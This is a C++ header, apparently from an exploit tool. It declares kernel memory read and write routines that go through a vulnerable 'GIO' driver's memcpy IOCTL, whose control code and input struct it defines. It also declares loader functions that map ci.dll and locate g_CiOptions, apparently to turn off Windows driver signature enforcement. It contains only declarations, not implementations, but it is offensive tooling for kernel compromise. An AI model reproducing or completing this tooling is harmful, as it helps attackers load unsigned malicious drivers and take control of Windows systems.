#pragma once

#define IOCTL_GIO_MEMCPY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x860, METHOD_BUFFERED, FILE_ANY_ACCESS)


namespace loader {

	bool MapCiDllToMemory( const std::wstring& dllPath, LPVOID& mappedBase );
	uintptr_t HdnGetProcAddress( void* hModule, const wchar_t* wAPIName );
	bool CompareStrings( const char* asciiStr, const wchar_t* wideStr );
	void* HdnGetModuleBase( const wchar_t* wModuleName );
	uintptr_t GetCiDllKernelBase();
	int32_t ReadRelOffset( const BYTE* addr );
	uintptr_t GetCipInitializeAddr( uintptr_t CiInitialize );
	uintptr_t Get_gCiOptions_Addr( uintptr_t CipInitialize, uintptr_t mappedBase, uintptr_t kernelBase );
	uintptr_t FindCiOptions( LPVOID mappedCiDll, uintptr_t kernelBase );
	uintptr_t FindCiOptionsByPattern( LPVOID mappedCiDll, size_t imageSize, uintptr_t kernelBase );
	uintptr_t FindCiOptionsInCiInitialize( LPVOID mappedCiDll, uintptr_t kernelBase, uintptr_t CiInitializeRVA );
}

namespace vul {


	bool WriteKernelMemory( HANDLE hDevice, uintptr_t dst, void* srcBuffer, size_t size );
	bool ReadKernelMemory( HANDLE hDevice, uintptr_t src, void* dstBuffer, size_t size );
}


struct GIOMemcpyInput {
	uintptr_t Src;
	uintptr_t Dst;
	size_t Size;
};